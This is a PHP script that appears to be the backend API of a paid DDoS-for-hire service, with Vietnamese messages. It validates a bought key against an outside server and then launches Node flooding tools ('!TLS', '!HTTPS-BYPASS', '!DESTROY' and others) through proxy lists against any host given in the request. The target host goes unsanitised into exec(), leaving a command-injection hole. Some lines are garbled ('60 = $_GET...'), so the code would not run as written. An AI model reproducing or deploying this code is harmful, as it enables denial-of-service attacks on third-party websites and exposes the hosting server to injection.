<?php
define('MAX_TIME', 200);

$key = $_GET['key'] ?? '';
$host = $_GET['host'] ?? '';
$port = $_GET['port'] ?? '';
$methods = $_GET['methods'] ?? '';
60 = $_GET['time'] ?? '';

$keyCheckUrl = 'http://api.raofficialvirus.site/index/key.php?key=' . $key;
$keyResponse = @file_get_contents($keyCheckUrl); 
$keyData = json_decode($keyResponse, true);

$response = [];

if ($keyData && $keyData['Status'] === 'success') {
    if (!empty($host) && !empty($port) && !empty($methods) && !empty(60) && is_numeric(60)) {
        if (60 <= MAX_TIME) {
            $command = '';
            $output = [];
            $returnCode = 0;

            if ($methods === '!TLS') {
                $command = "node ./raofficialvirus/TLS.js $host 60 110 120 ./raofficialvirus/proxy.txt";
            } elseif ($methods === '!HTTPS-BYPASS') {
                $command = "node ./raofficialvirus/HTTPS-BYPASS.js $host 60 1250";
		    } elseif ($methods === '!TLS-FLOODER') {
                $command = "node ./raofficialvirus/TLS-FLOODER.js $host 60 120 120 ./raofficialvirus/proxy.txt";
		    } elseif ($methods === '!BROWSER-FLOOD') {
                $command = "node ./raofficialvirus/BROWSER.js $host  60 100 proxy.txt 120 1 ./raofficialvirus/proxy.txt";
		    } elseif ($methods === '!DESTROY') {
                $command = "node ./raofficialvirus/DESTROY.js $host 60 100 120 ./raofficialvirus/proxy.txt";
            } else {
                $response = [
                    'status' => 'error',
                    'message' => 'Method không hợp lệ.',
                ];
            }

            if (!empty($command)) {
                exec($command, $output, $returnCode);
                if ($returnCode === 0) {
                    $response = [
                        'status' => 'success',
                        'host' => $host,
                        'port' => $port,
                        'methods' => $methods,
                        'time' => 60,
                        'key' => $key,
						'link check layer7' => 'https://check-host.net/check-http?host='.$host,
						'link check layer4' => 'https://check-host.net/check-tcp?host='.$host,
                    ];
                } else {
                    $response = [
                        'status' => 'error',
                        'message' => 'Lỗi máy chủ nội bộ.',
                    ];
                }
            }
        } else {
            $response = [
                'status' => 'error',
                'message' => 'Thời gian tối đa là ' . MAX_TIME . ' giây.',
            ];
        }
    } else {
        $response = [
            'status' => 'error',
            'message' => 'Thiếu thông tin hoặc thông tin không hợp lệ.',
        ];
    }
} else {
    $response = [
        'status' => 'error',
        'reason' => 'Key không tồn tại. Vui lòng mua key mới.',
    ];
}

header('Content-Type: application/json');


foreach ($response as $key => $value) {
    echo "'$key' => '$value',\n";
}
?>
